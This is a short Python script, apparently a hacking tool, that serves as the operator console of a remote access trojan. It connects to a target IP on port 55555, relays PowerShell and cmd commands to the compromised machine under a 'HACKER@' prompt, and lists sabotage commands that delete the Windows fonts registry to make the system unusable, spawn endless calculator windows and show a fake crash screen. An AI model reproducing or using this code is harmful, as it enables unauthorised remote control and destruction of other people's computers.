__author__ = 'RetR0'

import threading
import socket

host = input("\nIP address of the target : ")
print("")
port = int('55555')

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect ((host, port))

def reciv():
    message = client.recv(2048)
    message = message.decode()
    print (message)

def main():
    while True:
        a = bytearray(input(f"HACKER@{host}#").encode('utf-8'))
        if len(a) == 0:
            main()
        if a.decode() == "POWER":
            a = input("\npowershell>>")
            a = (f'powershell /c {a}').encode()
            client.send(a)
            reciv()
        if a.decode() == "CMD":
            a = input("\ncmd>>")
            a = (f'cmd /c {a}').encode()
            client.send(a)
            reciv()
        if a.decode() == "QUIT":
            client.close()
            quit()
        if a.decode() == "HELPME":
            print ("\ncommands.\n\nFUCKFONTS => delete the fonts REG (make windows un-usable)\nCALCCALCCALC => while true loop that start calcz\nFAKEBSOD => pops a red BSOD (so it's a RSOD)\nQUIT => for closing connection\nPOWER => for powershell commands\nCMD => for cmd command\n")
        else:
            client.send(a)
            reciv()

main()
